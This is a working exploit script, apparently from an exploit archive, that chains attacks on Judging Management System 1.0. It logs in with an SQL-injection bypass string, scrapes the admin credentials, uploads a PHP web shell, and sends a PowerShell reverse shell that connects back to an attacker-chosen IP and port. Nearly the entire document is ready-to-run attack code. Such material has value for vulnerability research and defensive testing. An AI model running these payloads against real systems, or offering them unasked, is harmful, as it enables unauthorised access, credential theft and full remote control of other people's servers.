@@ -1,0 +1,126 @@
+id: 38107
+date: 12/13/2022
+title: Judging Management System 1.0 Shell Upload Exploit
+author: Angelo Pio Amirante
+cves: 
+
+# Exploit Title: Judging Management System v1.0 - Remote Code Execution (RCE)
+# Date: 12/11/2022
+# Exploit Author: Angelo Pio Amirante
+# Vendor Homepage: https://www.sourcecodester.com/
+# Software Link: https://www.sourcecodester.com/php/15910/judging-management-system-using-php-and-mysql-free-source-code.html
+# Version: 1.0
+# Tested on: Windows 10 on XAAMP server
+
+
+import requests,argparse,re,time,base64
+import urllib.parse
+from colorama import (Fore as F,Back as B,Style as S)
+from bs4 import BeautifulSoup
+
+
+BANNER = """
+╔═══════════════════════════════════════════════════════════════════════════════════════════════════════╗
+║ Judging Management System v1.0 - Auth Bypass + Unrestricted File Upload = Remote Code Execution (RCE) ║
+╚═══════════════════════════════════════════════════════════════════════════════════════════════════════╝
+
+"""
+
+def argsetup():
+    desc = S.BRIGHT + 'Judging Management System v1.0 - Remote Code Execution (RCE)'
+    parser = argparse.ArgumentParser(description=desc)
+    parser.add_argument('-t', '--target', help='Target URL, Ex: http://localhost/php-jms', required=True)
+    parser.add_argument('-l', '--listenip', help='Listening address required to receive reverse shell', required=True)
+    parser.add_argument('-lp','--listenport', help='Listening port required to receive reverse shell', required=True)
+    args = parser.parse_args()
+    return args
+
+# Performs Auth bypass in order to get the admin cookie
+def auth_bypass(args):
+    print(F.CYAN+"[+] Login into the application through Auth Bypass vulnerability...")
+    session = requests.Session()
+    loginUrl = f"{args.target}/login.php"
+
+    username = """' OR 1=1-- -"""
+    password = "randomvalue1234"
+    data = {'username': username, 'password': password}
+
+    login = session.post(loginUrl,verify=False,data=data)
+    admin_cookie = login.cookies['PHPSESSID']
+    print(F.GREEN+"[+] Admin cookies obtained !!!")
+    return admin_cookie
+
+# Checks if the file has been uploaded to /uploads directory
+def check_file(args,cookie):
+    uploads_endpoint = f"{args.target}/uploads/"
+    cookies = {'PHPSESSID': f'{cookie}'}
+    req = requests.get(uploads_endpoint,verify=False,cookies=cookies)
+    soup = BeautifulSoup(req.text,features='html.parser')
+    files = soup.find_all("a")
+    for i in range (len(files)):
+        match = re.search(".*-shelljudgesystem\.php",files[i].get('href'))
+        if match:
+            file = files[i].get('href')
+            print(F.CYAN+"[+] The webshell is at the following Url: "+f"{args.target}/uploads/"+file)
+            return file
+        
+    
+    return None
+
+def file_upload(args,cookie):
+    now = int(time.time())
+    endpoint = f"{args.target}/edit_organizer.php"
+    cookies = {'wp-settings-time-1':f"{now}",'PHPSESSID': f'{cookie}'}
+    get_req = requests.get(endpoint,verify=False,cookies=cookies)
+    soup = BeautifulSoup(get_req.text,features='html.parser')
+    username = soup.find("input",{"name":"username"}).get('value')
+    admin_password = soup.find("input",{"id":"password"}).get('value')
+    print(F.GREEN + "[+] Admin username: " + username)
+    print(F.GREEN + "[+] Admin password: " + admin_password)
+    
+    
+    # Multi-part request
+    file_dict = {
+        'fname':(None,"Random"),
+        'mname':(None,"Random"),
+        'lname':(None,"Random"),
+        'email':(None,"ranom@mail.com"),
+        'pnum':(None,"014564343"),
+        'cname':(None,"Random"),
+        'caddress':(None,"Random"),
+        'ctelephone':(None,"928928392"),
+        'cemail':(None,"company@mail.com"),
+        'cwebsite':(None,"http://company.com"),
+        'file':("shelljudgesystem.php","<?php system($_REQUEST['cmd']) ?>","application/octet-stream"),
+        'username':(None,f"{admin_password}"),
+        'passwordx':(None,f"{admin_password}"),
+        'password2x':(None,f"{admin_password}"),
+        'password':(None,f"{admin_password}"),
+        'update':(None,"")
+    }
+    
+    req = requests.post(endpoint,verify=False,cookies=cookies,files=file_dict)
+
+
+def exploit(args,cookie,file):
+    payload = f"""powershell+-nop+-c+"$client+%3d+New-Object+System.Net.Sockets.TCPClient('{args.listenip}',{args.listenport})%3b"""+"""$stream+%3d+$client.GetStream()%3b[byte[]]$bytes+%3d+0..65535|%25{0}%3bwhile(($i+%3d+$stream.Read($bytes,+0,+$bytes.Length))+-ne+0){%3b$data+%3d+(New-Object+-TypeName+System.Text.ASCIIEncoding).GetString($bytes,0,+$i)%3b$sendback+%3d+(iex+$data+2>%261+|+Out-String+)%3b$sendback2+%3d+$sendback+%2b+'PS+'+%2b+(pwd).Path+%2b+'>+'%3b$sendbyte+%3d+([text.encoding]%3a%3aASCII).GetBytes($sendback2)%3b$stream.Write($sendbyte,0,$sendbyte.Length)%3b$stream.Flush()}%3b$client.Close()" """
+    uploads_endpoint = f"{args.target}/uploads/{file}?cmd={payload}"
+    cookies = {'PHPSESSID': f'{cookie}'}
+    print(F.GREEN + "\n[+] Enjoy your reverse shell ")
+    requests.get(uploads_endpoint,verify=False,cookies=cookies)
+            
+    
+
+if __name__ == '__main__':
+    print(F.CYAN +  BANNER)
+    args = argsetup()
+    cookie=auth_bypass(args=args)
+    file_upload(args=args,cookie=cookie)
+    file_name=check_file(args=args,cookie=cookie)
+    if file_name is not None:
+        exploit(args=args,cookie=cookie,file=file_name)
+        
+    else:
+        print(F.RED + "[!] File not found")
+
+#  0day.today [2023-03-27]  #
